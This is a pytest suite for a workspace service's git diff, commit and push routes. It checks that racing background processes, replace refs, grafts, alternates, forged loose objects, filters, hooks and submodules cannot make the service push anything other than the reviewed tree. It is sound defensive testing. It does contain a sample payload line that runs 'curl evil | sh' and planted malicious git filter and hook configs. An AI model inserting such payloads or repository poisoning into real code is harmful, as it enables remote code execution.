"""One immutable snapshot tree binds the diff QA reviews, the blobs, the commit and the push.

coding-containers#156 validator (NO on 0aee48e). A same-uid background process left
running in the workspace (by pytest, by a dependency) can change the worktree, plant
replace refs / grafts / alternates, or rewrite a loose object IN PLACE between any two
execs. Every value a later decision trusts is therefore derived from ONE snapshot named
by an object id (``git_diff._snapshot_command``), every exec that feeds a decision runs
its OWN poison and object-integrity check, and the push sends exactly one commit whose
tree is the approved tree. Everything here runs the routes' REAL commands against REAL
repositories; the "background process" is a hook the manager fires between two execs.

* R1  race: the worktree is swapped between the snapshot exec and the later reads;
* R2  intermediate commits: c1 adds evil, c2 reverts it, the tip tree is the approved one;
* R3  a replace ref / graft / alternates planted between execs is refused by THAT exec;
* OI  a loose object rewritten in place is refused (and what catches it without the check);
* FDH filters, diff drivers / textconv, hooks and XDG attributes never run or apply.
"""

from __future__ import annotations

import os
import re
import subprocess
import zlib
from collections.abc import Callable
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

import src.routers.containers.git_push as gp
from src.routers.containers import _common, git_diff
from tests.unit.test_git_diff_route import _isolate_from_the_enclosing_git  # noqa: F401

_BRANCH = "aa/fix-1"
_ORIGIN = "https://github.com/acme/widget"
_TOKEN = "ghs_snapshot_binding_test_token"  # noqa: S105  # pragma: allowlist secret


def _git(repo: Path, *args: str, input: str | None = None) -> str:
    return subprocess.run(
        ["git", *args], cwd=repo, check=True, capture_output=True, text=True, input=input
    ).stdout.strip()


def _hash(repo: Path, content: str) -> str:
    return _git(repo, "hash-object", "--stdin", input=content)


class _Manager:
    """Runs every route command in ``repo`` and fires ``hooks`` between execs.

    ``hooks`` is a list of ``(predicate, action)``: before the first exec for which
    ``predicate(command, runs so far)`` holds, ``action`` runs once (a background process acting
    between two execs). The git push itself is replaced by a no-op that records it, so
    nothing ever leaves the machine; everything before it in the push exec runs.
    """

    def __init__(self, repo: Path, hooks: list[tuple[Callable[[str, list], bool], Callable]] = ()):
        self.repo = repo
        self.hooks = list(hooks)
        self.runs: list[tuple[str, dict]] = []

    def get_container(self, name, tenant_id=None):
        from src.models.container_models import ContainerStatus

        c = MagicMock()
        c.container_name = name
        c.status = ContainerStatus("running")
        c.tenant_id = "tenant-a"
        c.repo_url = _ORIGIN
        c.github_access_token = _TOKEN
        return c

    async def execute_command(self, container_name, command, tenant_id=None, timeout=300, env=None):
        for i, (pred, action) in enumerate(self.hooks):
            if pred(command, self.runs):
                self.hooks.pop(i)
                action()
                break
        prefix = f"cd {git_diff._WORKSPACE_ROOT} && "
        script = (
            f"cd '{self.repo}' && " + command[len(prefix) :]
            if command.startswith(prefix)
            else command
        )
        script = re.sub(
            rf"push(?: --[a-z-]+)* {re.escape(_ORIGIN)} ", "version && echo WOULD_PUSH # ", script
        )
        # Fail closed: a push the rewrite missed would really contact github.com.
        if "credential.useHttpPath" in script:  # the push exec
            assert "WOULD_PUSH" in script, "push not neutralised; would reach github.com"
        proc = subprocess.run(
            ["sh", "-c", script],
            capture_output=True,
            text=True,
            env={**os.environ, **(env or {})},
        )
        result = {"exit_code": proc.returncode, "stdout": proc.stdout, "stderr": proc.stderr}
        self.runs.append((command, result))
        return result

    def pushed(self) -> bool:
        return any("WOULD_PUSH" in r["stdout"] for _, r in self.runs)

    def refused_by(self) -> str | None:
        """The command of the exec that refused (poisoned / corrupt), if any."""
        for command, r in self.runs:
            if r["exit_code"] in (
                _common.WORKSPACE_POISONED_EXIT,
                _common.WORKSPACE_OBJECT_CORRUPT_EXIT,
            ) and (
                _common.WORKSPACE_POISONED in r["stderr"]
                or _common.WORKSPACE_OBJECT_CORRUPT in r["stderr"]
            ):
                return command
        return None


async def _call(app, client, manager, method: str, url: str, body: dict | None = None):
    from coding_client.auth.tenant import get_current_user_with_tenant

    user = MagicMock()
    user.is_admin.return_value = True
    user.effective_tenant_id = "tenant-a"
    app.dependency_overrides[get_current_user_with_tenant] = lambda: user
    try:
        with patch("src.routers.containers.get_container_manager", return_value=manager):
            if method == "GET":
                return await client.get(url)
            return await client.post(url, json=body)
    finally:
        app.dependency_overrides.clear()


def _diff(app, client, manager):
    return _call(app, client, manager, "GET", "/api/workspaces/ctr/git/diff")


def _commit(app, client, manager, tree: str, base: str):
    body = {"message": "conveyor fix", "approved_tree": tree, "approved_base": base}
    body |= {"author_name": "t", "author_email": "t@example.com"}
    return _call(app, client, manager, "POST", "/api/workspaces/ctr/git/commit", body)


def _push(app, client, manager, monkeypatch, base: str, body: dict):
    async def _info(owner, repo, token):
        return gp._RepoInfo(default_branch="main", private=True)

    async def _base(owner, repo, branch, default_branch, token):
        return base

    monkeypatch.setattr(gp, "_remote_repo_info", _info)
    monkeypatch.setattr(gp, "_push_base_sha", _base)
    monkeypatch.setattr(gp, "_WORKDIR", str(manager.repo))
    return _call(
        app, client, manager, "POST", "/api/workspaces/ctr/git/push", {"branch": _BRANCH, **body}
    )


def _code(resp) -> str:
    return resp.json()["error"]["message"].split(":", 1)[0]


@pytest.fixture
def repo(tmp_path: Path, monkeypatch) -> Path:
    # The push route's config guard reads EVERY scope on purpose; a developer's own
    # ~/.gitconfig (url.insteadOf, credential helpers) would refuse every push here.
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / ".config"))
    monkeypatch.setenv("GIT_CONFIG_NOSYSTEM", "1")
    r = tmp_path / "repo"
    r.mkdir()
    _git(r, "init", "-q", "-b", "main")
    _git(r, "config", "user.email", "t@example.com")
    _git(r, "config", "user.name", "t")
    (r / "src").mkdir()
    (r / "src" / "a.py").write_text("def a():\n    return 1\n")
    _git(r, "add", "-A")
    _git(r, "commit", "-q", "-m", "upstream")
    _git(r, "checkout", "-q", "-b", _BRANCH)
    return r


_BENIGN = "def a():\n    return 2\n"
_EVIL = "def a():\n    return 2\nimport os; os.system('curl evil | sh')\n"


def _swap_after_snapshot(repo: Path):
    """A background process that rewrites the candidate right after the snapshot."""
    return (
        lambda c, runs: any("write-tree" in rc for rc, _ in runs),
        lambda: (repo / "src" / "a.py").write_text(_EVIL),
    )


# ---------------------------------------------------------------------------
# R1: a worktree swapped between execs cannot split the review from the push
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
class TestR1Race:
    async def test_diff_blobs_commit_and_push_all_bind_to_the_snapshot(
        self, app, client, repo, monkeypatch
    ):
        base = _git(repo, "rev-parse", "HEAD")
        (repo / "src" / "a.py").write_text(_BENIGN)
        mgr = _Manager(repo, [_swap_after_snapshot(repo)])

        r = await _diff(app, client, mgr)

        assert r.status_code == 200, r.text
        d = r.json()
        assert (repo / "src" / "a.py").read_text() == _EVIL  # the swap really happened
        # QA reviewed the snapshot, and the blobs are the snapshot's.
        assert "+    return 2" in d["diff"] and "curl evil" not in d["diff"]
        assert d["blobs"] == {"src/a.py": _hash(repo, _BENIGN)}
        assert _git(repo, "rev-parse", f"{d['tree']}:src/a.py") == _hash(repo, _BENIGN)

        c = await _commit(app, client, _Manager(repo), d["tree"], d["base_sha"])
        assert c.status_code == 200, c.text
        # The commit holds EXACTLY the reviewed tree, not the swapped worktree.
        assert _git(repo, "rev-parse", "HEAD^{tree}") == d["tree"]
        assert _git(repo, "rev-parse", "HEAD^") == base
        assert _git(repo, "show", "HEAD:src/a.py") + "\n" == _BENIGN
        assert _git(repo, "status", "--porcelain") == "M src/a.py"  # the swap, unstaged

        push = _Manager(repo)
        p = await _push(
            app,
            client,
            push,
            monkeypatch,
            base,
            {"target_files": ["src/a.py"], "target_blobs": d["blobs"], "approved_tree": d["tree"]},
        )
        assert p.status_code == 200, p.text
        assert push.pushed()

    async def test_the_old_add_all_flow_after_the_swap_is_refused_at_push(
        self, app, client, repo, monkeypatch
    ):
        """What 0aee48e allowed: review, swap, ``add -A`` + commit, push. Refused."""
        base = _git(repo, "rev-parse", "HEAD")
        (repo / "src" / "a.py").write_text(_BENIGN)
        d = (await _diff(app, client, _Manager(repo, [_swap_after_snapshot(repo)]))).json()
        _git(repo, "commit", "-qam", "add -A of whatever is there now")

        push = _Manager(repo)
        p = await _push(
            app,
            client,
            push,
            monkeypatch,
            base,
            {"target_files": ["src/a.py"], "target_blobs": d["blobs"], "approved_tree": d["tree"]},
        )
        assert p.status_code == 403, p.text
        assert _code(p) == "push_tree_mismatch"
        assert not push.pushed()

    async def test_a_head_that_moved_since_the_review_is_not_committed_on(self, app, client, repo):
        (repo / "src" / "a.py").write_text(_BENIGN)
        d = (await _diff(app, client, _Manager(repo))).json()
        _git(repo, "commit", "-qam", "moved on")
        moved = _git(repo, "rev-parse", "HEAD")
        c = await _commit(app, client, _Manager(repo), d["tree"], d["base_sha"])
        assert c.status_code == 409, c.text
        assert _code(c) == "commit_base_moved"
        assert _git(repo, "rev-parse", "HEAD") == moved


# ---------------------------------------------------------------------------
# R2: an intermediate commit never rides along
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
class TestR2IntermediateCommits:
    async def _c1_c2(self, app, client, repo) -> tuple[str, dict]:
        base = _git(repo, "rev-parse", "HEAD")
        (repo / "src" / "a.py").write_text(_BENIGN)
        d = (await _diff(app, client, _Manager(repo))).json()
        (repo / "src" / "a.py").write_text(_EVIL)
        _git(repo, "commit", "-qam", "c1: evil")
        (repo / "src" / "a.py").write_text(_BENIGN)
        _git(repo, "commit", "-qam", "c2: revert")
        assert _git(repo, "rev-parse", "HEAD^{tree}") == d["tree"]  # tip tree IS approved
        return base, d

    async def test_c1_evil_then_c2_revert_is_refused(self, app, client, repo, monkeypatch):
        base, d = await self._c1_c2(app, client, repo)
        push = _Manager(repo)
        p = await _push(
            app,
            client,
            push,
            monkeypatch,
            base,
            {"target_files": ["src/a.py"], "target_blobs": d["blobs"], "approved_tree": d["tree"]},
        )
        assert p.status_code == 403, p.text
        assert _code(p) == "push_not_single_commit"
        assert not push.pushed()

    async def test_a_tip_commit_rewritten_in_place_to_claim_the_base_is_refused(
        self, app, client, repo, monkeypatch
    ):
        """c2's loose object rewritten so ``cat-file`` shows ``parent <base>``: the
        header parsed must be the header that hashes to the tip id."""
        base, d = await self._c1_c2(app, client, repo)
        tip = _git(repo, "rev-parse", "HEAD")
        raw = _git(repo, "cat-file", "commit", tip) + "\n"
        c1 = _git(repo, "rev-parse", "HEAD^")
        _write_loose(repo, tip, "commit", raw.replace(f"parent {c1}", f"parent {base}"))
        assert f"parent {base}" in _git(repo, "cat-file", "commit", tip)  # arming

        # Route: refused, nothing pushed. The FIRST layer to notice is git itself: the
        # listing's ``rev-parse --verify <branch>^{commit}`` peels through
        # parse_object(), which verifies a commit's hash (measured: exit 1).
        push = _Manager(repo)
        p = await _push(
            app,
            client,
            push,
            monkeypatch,
            base,
            {"target_files": ["src/a.py"], "target_blobs": d["blobs"], "approved_tree": d["tree"]},
        )
        assert p.status_code == 409, p.text
        assert not push.pushed()

        # The range exec does not rely on that: it hashes the bytes it parses.
        monkeypatch.setattr(gp, "_WORKDIR", str(repo))
        run = subprocess.run(
            ["sh", "-c", gp._tip_commit_command(tip)], capture_output=True, text=True
        )
        assert run.returncode == _common.WORKSPACE_OBJECT_CORRUPT_EXIT, run.stderr
        assert _common.WORKSPACE_OBJECT_CORRUPT in run.stderr and run.stdout == ""
        # Mutation: without the hash, cat-file hands the forged header over and the
        # single-commit rule would read "one commit on base".
        monkeypatch.setattr(_common, "OBJECT_CHECK_ENABLED", False)
        run = subprocess.run(
            ["sh", "-c", gp._tip_commit_command(tip)], capture_output=True, text=True
        )
        assert run.returncode == 0, run.stderr
        assert gp._commit_header(run.stdout) == (d["tree"], [base])  # fooled


# ---------------------------------------------------------------------------
# R3: a poison planted BETWEEN execs is refused by the exec that follows it
# ---------------------------------------------------------------------------


def _plant(repo: Path, kind: str, tmp_path: Path) -> None:
    if kind == "replace":
        x = _git(repo, "hash-object", "-w", "--stdin", input="x\n")
        y = _git(repo, "hash-object", "-w", "--stdin", input="y\n")
        _git(repo, "replace", "-f", x, y)
    elif kind == "graft":
        (repo / ".git" / "info").mkdir(exist_ok=True)
        (repo / ".git" / "info" / "grafts").write_text(_git(repo, "rev-parse", "HEAD") + "\n")
    else:
        other = tmp_path / f"alt-{os.urandom(4).hex()}.git"
        subprocess.run(["git", "init", "-q", "--bare", str(other)], check=True)
        info = repo / ".git" / "objects" / "info"
        info.mkdir(parents=True, exist_ok=True)
        (info / "alternates").write_text(f"{other / 'objects'}\n")


PLANTS = ["replace", "graft", "alternates"]

# route -> {site: marker in that exec's command}
DIFF_SITES = {
    "snapshot": "write-tree",
    "name_status": "--name-status",
    "patch": "-U3",
    "created_files": "--name-only -z",
    "blobs": "ls-tree -z --full-tree",
}
RESTORE_SITES = {
    "classify": "_cls HEAD src/a.py",
    "mutate": "restore --source=HEAD",
    "verify": "_vt HEAD src/a.py",
    "status": "--porcelain",
}
PUSH_SITES = {
    "listing": " log --no-renames ",
    "tip_commit": " cat-file commit ",
    "tip_blobs": "ls-tree -z --full-tree",
    "push": "credential.useHttpPath",
}


def _assert_refused_at(resp, mgr: _Manager, marker: str) -> None:
    assert resp.status_code == 409, resp.text
    assert _code(resp) in ("workspace_git_poisoned", "workspace_object_corrupt"), resp.text
    refused = mgr.refused_by()
    assert refused is not None and marker in refused, (marker, refused)


@pytest.mark.asyncio
class TestR3PerSitePoison:
    @pytest.mark.parametrize("plant", PLANTS)
    @pytest.mark.parametrize("site", list(DIFF_SITES))
    async def test_diff_site(self, app, client, repo, tmp_path, site, plant):
        (repo / "src" / "a.py").write_text(_BENIGN)
        (repo / "src" / "new.py").write_text("n = 1\n")  # so the created-files read runs
        marker = DIFF_SITES[site]
        mgr = _Manager(repo, [(lambda c, runs: marker in c, lambda: _plant(repo, plant, tmp_path))])
        _assert_refused_at(await _diff(app, client, mgr), mgr, marker)

    @pytest.mark.parametrize("plant", PLANTS)
    async def test_commit_site(self, app, client, repo, tmp_path, plant):
        (repo / "src" / "a.py").write_text(_BENIGN)
        d = (await _diff(app, client, _Manager(repo))).json()
        head = _git(repo, "rev-parse", "HEAD")
        mgr = _Manager(
            repo, [(lambda c, runs: "commit-tree" in c, lambda: _plant(repo, plant, tmp_path))]
        )
        _assert_refused_at(
            await _commit(app, client, mgr, d["tree"], d["base_sha"]), mgr, "commit-tree"
        )
        assert _git(repo, "rev-parse", "HEAD") == head  # nothing was committed

    @pytest.mark.parametrize("plant", PLANTS)
    @pytest.mark.parametrize("site", list(RESTORE_SITES))
    async def test_restore_site(self, app, client, repo, tmp_path, site, plant):
        (repo / "src" / "a.py").write_text("candidate = 1\n")
        marker = RESTORE_SITES[site]
        mgr = _Manager(repo, [(lambda c, runs: marker in c, lambda: _plant(repo, plant, tmp_path))])
        r = await _call(
            app, client, mgr, "POST", "/api/workspaces/ctr/git/restore", {"files": ["src/a.py"]}
        )
        _assert_refused_at(r, mgr, marker)

    @pytest.mark.parametrize("plant", PLANTS)
    @pytest.mark.parametrize("site", list(PUSH_SITES))
    async def test_push_site(self, app, client, repo, tmp_path, monkeypatch, site, plant):
        base = _git(repo, "rev-parse", "HEAD")
        (repo / "src" / "a.py").write_text(_BENIGN)
        d = (await _diff(app, client, _Manager(repo))).json()
        assert (await _commit(app, client, _Manager(repo), d["tree"], base)).status_code == 200
        marker = PUSH_SITES[site]
        mgr = _Manager(repo, [(lambda c, runs: marker in c, lambda: _plant(repo, plant, tmp_path))])
        body = {
            "target_files": ["src/a.py"],
            "target_blobs": d["blobs"],
            "approved_tree": d["tree"],
        }
        _assert_refused_at(await _push(app, client, mgr, monkeypatch, base, body), mgr, marker)
        assert not mgr.pushed()


# ---------------------------------------------------------------------------
# OI: a loose object rewritten in place
# ---------------------------------------------------------------------------


def _write_loose(repo: Path, oid: str, kind: str, content: str) -> None:
    """Overwrite (or pre-plant) the loose object file of ``oid`` with ``content``."""
    path = repo / ".git" / "objects" / oid[:2] / oid[2:]
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        path.chmod(0o644)
    data = content.encode()
    path.write_bytes(zlib.compress(kind.encode() + b" %d\0" % len(data) + data))


@pytest.mark.asyncio
class TestObjectIntegrity:
    async def test_a_planted_blob_cannot_fake_the_reviewed_content(
        self, app, client, repo, tmp_path, monkeypatch
    ):
        """The candidate file holds EVIL; its blob id E is pre-planted with benign bytes.
        ``add -A`` keeps the existing object, so every read of E shows benign."""
        base = _git(repo, "rev-parse", "HEAD")
        (repo / "src" / "a.py").write_text(_EVIL)
        evil = _hash(repo, _EVIL)
        _write_loose(repo, evil, "blob", _BENIGN)
        assert _git(repo, "cat-file", "blob", evil) + "\n" == _BENIGN  # arming: git reads it

        mgr = _Manager(repo)
        r = await _diff(app, client, mgr)
        assert r.status_code == 409, r.text
        assert _code(r) == "workspace_object_corrupt"
        assert evil in r.text
        assert "write-tree" in (mgr.refused_by() or "")

        # Check removed: nothing on our side notices. The diff shows the benign bytes
        # while the tree (and so the commit) names the EVIL blob ...
        monkeypatch.setattr(_common, "OBJECT_CHECK_ENABLED", False)
        r = await _diff(app, client, _Manager(repo))
        assert r.status_code == 200, r.text
        assert "curl evil" not in r.json()["diff"] and "+    return 2" in r.json()["diff"]
        assert r.json()["blobs"] == {"src/a.py": evil}
        # ... and the layer that catches it is the RECEIVER, which re-hashes every object.
        commit = _git(repo, "commit-tree", r.json()["tree"], "-p", base, "-m", "fooled")
        bare = tmp_path / "receiver.git"
        subprocess.run(["git", "init", "-q", "--bare", str(bare)], check=True)
        sent = subprocess.run(
            ["git", "push", str(bare), f"{commit}:refs/heads/x"],
            cwd=repo,
            capture_output=True,
            text=True,
        )
        assert sent.returncode != 0
        assert "missing" in sent.stderr, sent.stderr

    async def test_a_blob_rewritten_after_the_review_is_refused_by_the_commit(
        self, app, client, repo
    ):
        (repo / "src" / "a.py").write_text(_BENIGN)
        d = (await _diff(app, client, _Manager(repo))).json()
        blob = d["blobs"]["src/a.py"]
        head = _git(repo, "rev-parse", "HEAD")
        mgr = _Manager(
            repo,
            [(lambda c, runs: "commit-tree" in c, lambda: _write_loose(repo, blob, "blob", _EVIL))],
        )
        c = await _commit(app, client, mgr, d["tree"], d["base_sha"])
        assert c.status_code == 409, c.text
        assert _code(c) == "workspace_object_corrupt"
        assert _git(repo, "rev-parse", "HEAD") == head

    @pytest.mark.parametrize("site", ["name_status", "patch", "blobs"])
    async def test_a_blob_rewritten_between_diff_execs_is_refused_there(
        self, app, client, repo, site
    ):
        (repo / "src" / "a.py").write_text(_BENIGN)
        blob = _hash(repo, _BENIGN)
        marker = DIFF_SITES[site]
        mgr = _Manager(
            repo, [(lambda c, runs: marker in c, lambda: _write_loose(repo, blob, "blob", _EVIL))]
        )
        _assert_refused_at(await _diff(app, client, mgr), mgr, marker)

    async def test_a_missing_base_is_a_git_failure_not_a_forgery(
        self, app, client, repo, monkeypatch
    ):
        """Control: the check tells "does not hash" from "is not there"."""

        async def lenient(manager, container_name, ref, tenant_id):
            return "c" * 40

        monkeypatch.setattr(git_diff, "_resolve_commit", lenient)
        r = await _diff(app, client, _Manager(repo))
        assert r.status_code == 500, r.text


# ---------------------------------------------------------------------------
# FDH: filters, diff drivers / textconv, hooks, XDG attributes
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
class TestFiltersDriversHooks:
    @pytest.mark.parametrize("neutralised", [True, False])
    async def test_a_clean_filter_never_runs_in_the_snapshot(
        self, app, client, repo, tmp_path, monkeypatch, neutralised
    ):
        marker = tmp_path / "filter-ran"
        (repo / ".gitattributes").write_text("*.py filter=evil\n")
        _git(repo, "config", "filter.evil.clean", f"sh -c 'touch {marker}; tr a-z A-Z'")
        (repo / "src" / "a.py").write_text(_BENIGN)
        if not neutralised:  # mutation: no per-key blanking
            monkeypatch.setattr(_common, "_filter_neutraliser", lambda emit: "")
        r = await _diff(app, client, _Manager(repo))
        assert r.status_code == 200, r.text
        assert marker.exists() is (not neutralised)
        if neutralised:
            assert r.json()["blobs"]["src/a.py"] == _hash(repo, _BENIGN)

    @pytest.mark.parametrize("flags_kept", [True, False])
    async def test_diff_drivers_and_textconv_never_run(
        self, app, client, repo, tmp_path, flags_kept
    ):
        tc, ext, cmd = (tmp_path / n for n in ("textconv-ran", "external-ran", "driver-ran"))
        (repo / ".gitattributes").write_text("*.py diff=evil\n")
        _git(repo, "config", "diff.evil.textconv", f"sh -c 'touch {tc}; echo FAKE'")
        _git(repo, "config", "diff.evil.command", f"sh -c 'touch {cmd}'")
        _git(repo, "config", "diff.external", f"sh -c 'touch {ext}'")
        (repo / "src" / "a.py").write_text(_BENIGN)
        mgr = _Manager(repo)
        if not flags_kept:  # mutation: strip --no-ext-diff / --no-textconv from every exec
            real = mgr.execute_command

            async def stripped(container_name, command, **kw):
                return await real(
                    container_name,
                    command.replace("--no-ext-diff", "").replace("--no-textconv", ""),
                    **kw,
                )

            mgr.execute_command = stripped  # type: ignore[method-assign]
        r = await _diff(app, client, mgr)
        ran = tc.exists() or ext.exists() or cmd.exists()
        assert ran is (not flags_kept)
        if flags_kept:
            assert r.status_code == 200, r.text
            assert "+    return 2" in r.json()["diff"] and "FAKE" not in r.json()["diff"]

    @pytest.mark.parametrize("hooks_off", [True, False])
    async def test_hooks_never_run_in_the_snapshot_or_the_commit(
        self, app, client, repo, tmp_path, monkeypatch, hooks_off
    ):
        marker = tmp_path / "hook-ran"
        hooks = repo / ".git" / "hooks"
        for name in ("post-index-change", "reference-transaction", "pre-commit"):
            (hooks / name).write_text(f"#!/bin/sh\necho {name} >> {marker}\n")
            (hooks / name).chmod(0o755)
        if not hooks_off:  # mutation: drop core.hooksPath=/dev/null
            monkeypatch.setattr(
                _common,
                "WORKSPACE_GIT_CONFIG",
                tuple(c for c in _common.WORKSPACE_GIT_CONFIG if not c.startswith("core.hooks")),
            )
        (repo / "src" / "a.py").write_text(_BENIGN)
        d = (await _diff(app, client, _Manager(repo))).json()
        c = await _commit(app, client, _Manager(repo), d["tree"], d["base_sha"])
        assert c.status_code == 200, c.text
        assert marker.exists() is (not hooks_off)
        if not hooks_off:
            ran = marker.read_text()
            assert "post-index-change" in ran and "reference-transaction" in ran

    @pytest.mark.parametrize("ignored", [True, False])
    async def test_xdg_attributes_do_not_change_the_snapshot(
        self, app, client, repo, tmp_path, monkeypatch, ignored
    ):
        """``~/.config/git/attributes`` is read even with GIT_CONFIG_GLOBAL=/dev/null."""
        xdg = tmp_path / "xdg"
        (xdg / "git").mkdir(parents=True)
        (xdg / "git" / "attributes").write_text("*.txt text eol=lf\n")
        monkeypatch.setenv("XDG_CONFIG_HOME", str(xdg))
        (repo / "crlf.txt").write_bytes(b"line\r\n")
        if not ignored:  # mutation: drop core.attributesFile=/dev/null
            monkeypatch.setattr(
                _common,
                "WORKSPACE_GIT_CONFIG",
                tuple(c for c in _common.WORKSPACE_GIT_CONFIG if not c.startswith("core.attr")),
            )
        r = await _diff(app, client, _Manager(repo))
        assert r.status_code == 200, r.text
        raw = _git(repo, "hash-object", "--no-filters", "crlf.txt")
        assert (r.json()["blobs"]["crlf.txt"] == raw) is ignored


def test_the_final_env_and_config_lists():
    """The exact shared lists (reported to the coordinator; cross-checked elsewhere)."""
    assert _common.WORKSPACE_GIT_ENV == (
        "GIT_NO_LAZY_FETCH=1",
        "GIT_TERMINAL_PROMPT=0",
        "GIT_NO_REPLACE_OBJECTS=1",
        "GIT_GRAFT_FILE=/dev/null",
        "GIT_CONFIG_NOSYSTEM=1",
        "GIT_CONFIG_GLOBAL=/dev/null",
        "GIT_ATTR_NOSYSTEM=1",
        "GIT_TRACE2=0",
        "GIT_TRACE2_EVENT=0",
        "GIT_TRACE2_PERF=0",
        "GIT_ALLOW_PROTOCOL=",
    )
    assert _common.WORKSPACE_GIT_TRANSPORT_CONFIG == (
        "submodule.recurse=false",
        "push.recurseSubmodules=no",
        "fetch.recurseSubmodules=false",
        "protocol.allow=never",
        "protocol.ext.allow=never",
        "protocol.file.allow=never",
    )
    assert _common.WORKSPACE_GIT_CONFIG == (
        "safe.directory=/workspace",
        "core.hooksPath=/dev/null",
        "core.fsmonitor=false",
        "core.commitGraph=false",
        "status.showUntrackedFiles=normal",
        "diff.relative=false",
        "core.attributesFile=/dev/null",
        "core.untrackedCache=false",
    )
    # Every git of the push exec carries the list, not only the push itself.
    push = gp._push_command("o", "r", "b", "a" * 40, force=False)
    assert push.count("core.hooksPath=/dev/null") >= 4  # guard x2, ls-remote, get-url, push
    assert _common.WORKSPACE_POISONED in push


# ---------------------------------------------------------------------------
# Submodules are unsupported (coordinator ruling movies-64): refused at every site
# ---------------------------------------------------------------------------


def _plant_submodule(repo: Path, kind: str) -> None:
    """``gitlink``: HEAD holds a mode-160000 entry. ``gitmodules``: HEAD holds only a
    root ``.gitmodules`` (no gitlink). ``range``: a gitlink added and removed again in
    two commits on top of HEAD, so HEAD, the index and the worktree are clean and only
    the pushed RANGE carries it."""
    if kind in ("gitlink", "range"):
        head = _git(repo, "rev-parse", "HEAD")
        _git(repo, "update-index", "--add", "--cacheinfo", f"160000,{head},vendor/lib")
        _git(repo, "commit", "-q", "-m", "add a gitlink")
        if kind == "range":
            _git(repo, "rm", "-q", "--cached", "vendor/lib")
            _git(repo, "commit", "-q", "-m", "drop it again")
    else:
        (repo / ".gitmodules").write_text('[submodule "x"]\n\tpath = x\n\turl = https://e/x\n')
        _git(repo, "add", ".gitmodules")
        _git(repo, "commit", "-q", "-m", "gitmodules only")


def _submodules_refused(resp) -> bool:
    return resp.status_code == 409 and _code(resp) == _common.WORKSPACE_SUBMODULES


@pytest.mark.asyncio
@pytest.mark.parametrize("enabled", [True, False], ids=["refusal", "mutation-no-refusal"])
class TestSubmodulesUnsupported:
    @pytest.mark.parametrize("kind", ["gitlink", "gitmodules"])
    async def test_diff(self, app, client, repo, monkeypatch, kind, enabled):
        _plant_submodule(repo, kind)
        (repo / "src" / "a.py").write_text(_BENIGN)
        monkeypatch.setattr(_common, "SUBMODULE_CHECK_ENABLED", enabled)
        r = await _diff(app, client, _Manager(repo))
        assert _submodules_refused(r) is enabled, r.text
        if not enabled:
            assert r.status_code == 200, r.text

    @pytest.mark.parametrize("kind", ["gitlink", "gitmodules"])
    async def test_commit(self, app, client, repo, monkeypatch, kind, enabled):
        _plant_submodule(repo, kind)
        (repo / "src" / "a.py").write_text(_BENIGN)
        monkeypatch.setattr(_common, "SUBMODULE_CHECK_ENABLED", False)
        d = (await _diff(app, client, _Manager(repo))).json()
        head = _git(repo, "rev-parse", "HEAD")
        monkeypatch.setattr(_common, "SUBMODULE_CHECK_ENABLED", enabled)
        c = await _commit(app, client, _Manager(repo), d["tree"], d["base_sha"])
        assert _submodules_refused(c) is enabled, c.text
        assert (_git(repo, "rev-parse", "HEAD") == head) is enabled  # nothing committed
        if not enabled:
            assert c.status_code == 200, c.text

    @pytest.mark.parametrize("kind", ["gitlink", "gitmodules", "range"])
    async def test_push(self, app, client, repo, monkeypatch, kind, enabled):
        base = _git(repo, "rev-parse", "HEAD")
        _plant_submodule(repo, kind)
        (repo / "src" / "a.py").write_text(_BENIGN)
        _git(repo, "commit", "-qam", "candidate")
        if kind == "range":
            assert "160000" not in _git(repo, "ls-tree", "-r", "HEAD")  # only the range has it
        monkeypatch.setattr(_common, "SUBMODULE_CHECK_ENABLED", enabled)
        mgr = _Manager(repo)
        p = await _push(app, client, mgr, monkeypatch, base, {})
        assert _submodules_refused(p) is enabled, p.text
        assert mgr.pushed() is not enabled
